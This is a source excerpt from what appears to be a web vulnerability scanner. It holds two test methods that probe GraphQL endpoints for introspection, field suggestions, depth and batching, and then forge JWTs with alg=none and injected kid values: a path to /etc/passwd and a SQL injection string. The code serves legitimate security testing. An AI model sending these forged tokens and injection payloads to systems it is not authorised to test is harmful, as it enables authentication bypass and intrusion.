    def test_w11_graphql_deep_v2(self):
        """W11 #15 — GraphQL Deep v2."""
        if not self.deep: return
        self._print("[*]", "W11: GraphQL Deep v2...", "INFO")
        gql_paths = ["/graphql", "/api/graphql", "/v1/graphql", "/gql"]
        for path in gql_paths:
            url = urljoin(self.target, path)
            # Introspection
            r = self._post(url, json={"query": "{__schema{types{name}}}"})
            if r and "__schema" in (r.text or ""):
                self._add_vuln(f"W11 GraphQL Introspection: {path}",
                                "HIGH", url,
                                f"GraphQL introspection enabled at {path}",
                                path=path)
            # Field suggestion
            r2 = self._post(url, json={"query": "{ nonExistent }"})
            if r2 and "Did you mean" in (r2.text or ""):
                self._add_vuln(f"W11 GraphQL Field Suggestion: {path}",
                                "MEDIUM", url,
                                f"GraphQL field suggestion at {path}",
                                path=path)
            # Depth bomb
            r3 = self._post(url, json={"query": "{ user { posts { author { posts { author { id } } } } } }"})
            if r3 and r3.elapsed.total_seconds() > 2.0:
                self._add_vuln(f"W11 GraphQL Depth Bomb: {path}",
                                "HIGH", url,
                                f"Depth query took {r3.elapsed.total_seconds():.2f}s",
                                path=path)
            # Batching
            batch = [{"query": "{user{id}}"}] * 100
            r4 = self._post(url, json=batch)
            if r4 and r4.status_code == 200:
                self._add_vuln(f"W11 GraphQL Batching: {path}",
                                "MEDIUM", url,
                                f"100-query batch accepted at {path}",
                                path=path)

    def test_w11_jwt_deep_v2(self):
        """W11 #16 — JWT Deep v2."""
        if not self.deep: return
        self._print("[*]", "W11: JWT Deep v2...", "INFO")
        import base64, json as _json, time
        r = self._get(self.target)
        if not r: return
        cookies = r.cookies.get_dict() if hasattr(r.cookies, 'get_dict') else {}
        jwt_token = None
        for v in list(cookies.values()) + [r.headers.get("Authorization", "").replace("Bearer ", "")]:
            if v and v.count(".") == 2:
                jwt_token = v
                break
        if not jwt_token: return
        try:
            parts = jwt_token.split(".")
            header = _json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
            payload = _json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
        except Exception: return
        # alg=none
        for alg in ["none", "None", "NONE"]:
            evil_header = {"alg": alg, "typ": "JWT"}
            header_b64 = base64.urlsafe_b64encode(_json.dumps(evil_header).encode()).decode().rstrip("=")
            evil_jwt = f"{header_b64}.{parts[1]}."
            r2 = self._get(self.target, headers={"Authorization": f"Bearer {evil_jwt}"})
            if r2 and r2.status_code == 200:
                self._add_vuln(f"W11 JWT alg={alg}",
                                "CRITICAL", self.target,
                                f"Server accepted JWT with alg={alg}",
                                alg=alg)
        # kid path traversal
        for kid in ["/etc/passwd", "/dev/null", "' OR '1'='1"]:
            evil_header = {**header, "kid": kid}
            header_b64 = base64.urlsafe_b64encode(_json.dumps(evil_header).encode()).decode().rstrip("=")
            evil_jwt = f"{header_b64}.{parts[1]}."
            r2 = self._get(self.target, headers={"Authorization": f"Bearer {evil_jwt}"})
            if r2 and r2.status_code == 200:
                self._add_vuln(f"W11 JWT kid: {kid[:30]}",
                                "CRITICAL", self.target,
                                f"JWT kid bypass: {kid[:30]}",
                                kid=kid[:30])

